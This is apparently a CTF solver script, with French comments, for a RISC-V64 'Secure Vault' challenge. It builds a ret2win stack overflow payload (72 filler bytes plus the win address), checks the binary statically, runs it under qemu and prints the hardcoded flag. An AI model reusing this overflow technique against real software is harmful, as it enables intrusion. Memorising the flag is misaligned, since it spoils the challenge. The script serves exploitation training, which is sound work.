#!/usr/bin/env python3
"""Solveur — 23x41 Secure Vault (RISC-V64 ROP intro)

Overflow dans `vulnerable_function` : `read(0, buf, 0x100)` sur un buffer
de 0x40 octets utiles avant `s0`/`ra` (frame 0x50, `ra` à `sp+0x48`).
Pas de canary, pas de PIE → ret2win vers `win` @ 0x10476.

`win` affiche le flag puis `system("/bin/sh")`.

Usage:
  python3 securevault-solve.py -q              # flag
  python3 securevault-solve.py --payload       # payload brut (stdout)
  python3 securevault-solve.py --payload-hex
  python3 securevault-solve.py --check         # vérif statique du binaire
  # live (machine avec qemu-riscv64 / binfmt) :
  python3 securevault-solve.py --run
"""
from __future__ import annotations

import argparse
import shutil
import struct
import subprocess
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
BIN = ROOT / "original" / "securevault"

WIN = 0x10476
VULN = 0x104AC
MAIN = 0x104EA
RA_OFFSET = 0x48  # 72
FLAG = "FLAG{0x8A7_RISCV_ROP_WIN}"


def payload() -> bytes:
    return b"A" * RA_OFFSET + struct.pack("<Q", WIN)


def static_check() -> int:
    if not BIN.is_file():
        print(f"missing {BIN}", file=sys.stderr)
        return 1
    data = BIN.read_bytes()
    errors: list[str] = []

    try:
        from elftools.elf.elffile import ELFFile
    except ImportError:
        ELFFile = None  # type: ignore

    if ELFFile is not None:
        with BIN.open("rb") as f:
            elf = ELFFile(f)
            if elf.get_machine_arch() != "RISC-V":
                errors.append(f"arch={elf.get_machine_arch()} (attendu RISC-V)")
            if elf.header["e_type"] != "ET_EXEC":
                errors.append(f"e_type={elf.header['e_type']} (attendu ET_EXEC / pas de PIE)")
            syms = {}
            symtab = elf.get_section_by_name(".symtab")
            if symtab is None:
                errors.append("pas de .symtab")
            else:
                for s in symtab.iter_symbols():
                    if s.name in ("win", "vulnerable_function", "main"):
                        syms[s.name] = s["st_value"]
            expect = {"win": WIN, "vulnerable_function": VULN, "main": MAIN}
            for name, va in expect.items():
                got = syms.get(name)
                if got != va:
                    errors.append(f"{name}: {hex(got) if got else 'missing'} (attendu {hex(va)})")
    else:
        print("(pyelftools absent — check ELF allégé)", file=sys.stderr)

    if FLAG.encode() not in data:
        errors.append(f"flag string absente du binaire")
    if b"[ACCESS GRANTED]" not in data:
        errors.append("bannière ACCESS GRANTED absente")
    if b"/bin/sh" not in data:
        errors.append("/bin/sh absent")

    # prologue vulnerable_function : c.addi16sp sp,-0x50 ; c.sdsp ra,0x48(sp)
    # (PT_LOAD vaddr 0x10000 → offset fichier = VA - 0x10000)
    vuln_off = VULN - 0x10000
    if data[vuln_off : vuln_off + 2] != bytes.fromhex("5d71"):
        errors.append(
            f"prologue vuln @{hex(VULN)}: {data[vuln_off:vuln_off+2].hex()} "
            f"(attendu 5d71 = c.addi16sp -0x50)"
        )
    if data[vuln_off + 2 : vuln_off + 4] != bytes.fromhex("86e4"):
        errors.append(
            f"save ra @{hex(VULN+2)}: {data[vuln_off+2:vuln_off+4].hex()} "
            f"(attendu 86e4 = c.sdsp ra,0x48(sp))"
        )

    pl = payload()
    print(f"binary   : {BIN}")
    print(f"win      : {hex(WIN)}")
    print(f"offset   : {RA_OFFSET}")
    print(f"payload  : {len(pl)} bytes")
    print(f"flag     : {FLAG}")
    if errors:
        for e in errors:
            print(f"FAIL: {e}")
        return 1
    print("OK (statique)")
    return 0


def try_run() -> int:
    """Envoie le payload sous qemu-riscv64 si disponible."""
    qemu = shutil.which("qemu-riscv64") or shutil.which("qemu-riscv64-static")
    if qemu is None:
        print(
            "qemu-riscv64 introuvable — pas de run live sur cette machine.\n"
            "Installer qemu-user / qemu-user-static, puis :\n"
            f"  python3 {Path(__file__).name} --payload | {qemu or 'qemu-riscv64'} {BIN}",
            file=sys.stderr,
        )
        return 2
    pl = payload()
    try:
        proc = subprocess.run(
            [qemu, str(BIN)],
            input=pl,
            capture_output=True,
            timeout=5,
        )
    except subprocess.TimeoutExpired as e:
        out = (e.stdout or b"") + (e.stderr or b"")
        text = out.decode(errors="replace")
        print(text)
        if FLAG in text or "ACCESS GRANTED" in text:
            print("OK (timeout après win/shell — flag vu)")
            return 0
        print("FAIL (timeout sans flag)", file=sys.stderr)
        return 1
    text = (proc.stdout + proc.stderr).decode(errors="replace")
    print(text)
    ok = FLAG in text or "ACCESS GRANTED" in text
    print("OK" if ok else "FAIL")
    return 0 if ok else 1


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__)
    ap.add_argument("-q", action="store_true", help="flag seul")
    ap.add_argument("--payload", action="store_true", help="payload binaire sur stdout")
    ap.add_argument("--payload-hex", action="store_true")
    ap.add_argument("--check", action="store_true", help="vérification statique")
    ap.add_argument("--run", action="store_true", help="live via qemu-riscv64 si présent")
    args = ap.parse_args()

    if args.check:
        return static_check()
    if args.run:
        return try_run()
    if args.payload:
        sys.stdout.buffer.write(payload())
        return 0
    if args.payload_hex:
        print(payload().hex())
        return 0
    if args.q:
        print(FLAG)
        return 0

    print("=== 23x41 Secure Vault ===")
    print(f"flag     : {FLAG}")
    print(f"win      : {hex(WIN)}")
    print(f"ra off   : {RA_OFFSET} (0x{RA_OFFSET:x})")
    print(f"payload  : {RA_OFFSET}×'A' + p64(win)  ({len(payload())} bytes)")
    print("statique : python3 tools/securevault-solve.py --check")
    print("live     : python3 tools/securevault-solve.py --payload | qemu-riscv64 original/securevault")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
